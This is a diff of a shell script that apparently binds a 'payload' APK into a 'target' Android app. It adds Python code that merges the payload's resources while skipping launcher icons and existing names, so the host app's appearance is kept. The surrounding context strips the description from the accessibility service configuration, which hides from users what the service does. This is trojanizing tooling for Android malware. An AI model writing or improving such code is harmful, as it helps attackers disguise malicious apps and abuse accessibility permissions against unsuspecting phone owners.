@@ -199,7 +199,37 @@ done
 if [ -d "$PAYLOAD_DIR/res" ]; then
     echo -e "${CYAN}[*] Merging payload resources into target res directory...${NC}"
     mkdir -p "$TARGET_DIR/res"
-    cp -rn "$PAYLOAD_DIR/res"/* "$TARGET_DIR/res/" 2>/dev/null || true
+    python3 - "$PAYLOAD_DIR/res" "$TARGET_DIR/res" << 'EOF'
+import sys, os, shutil
+
+payload_res, target_res = sys.argv[1], sys.argv[2]
+if os.path.exists(payload_res):
+    os.makedirs(target_res, exist_ok=True)
+    skip_bases = {"ic_launcher", "ic_launcher_round", "ic_launcher_foreground", "ic_launcher_background"}
+    for root, dirs, files in os.walk(payload_res):
+        rel = os.path.relpath(root, payload_res)
+        dst_root = os.path.join(target_res, rel)
+        os.makedirs(dst_root, exist_ok=True)
+
+        existing_bases = set()
+        if os.path.exists(dst_root):
+            for existing_f in os.listdir(dst_root):
+                ebase, _ = os.path.splitext(existing_f)
+                existing_bases.add(ebase.lower())
+
+        for f in files:
+            sf = os.path.join(root, f)
+            df = os.path.join(dst_root, f)
+            f_base, _ = os.path.splitext(f)
+            f_base_lower = f_base.lower()
+
+            if f_base_lower in skip_bases or f_base_lower in existing_bases:
+                continue
+
+            if not os.path.exists(df):
+                shutil.copy2(sf, df)
+                existing_bases.add(f_base_lower)
+EOF
     if [ -f "$TARGET_DIR/res/xml/accessibility_service_config.xml" ]; then
         sed -i.bak 's|android:description="[^"]*"||g' "$TARGET_DIR/res/xml/accessibility_service_config.xml" 2>/dev/null
         rm -f "$TARGET_DIR/res/xml/accessibility_service_config.xml.bak"
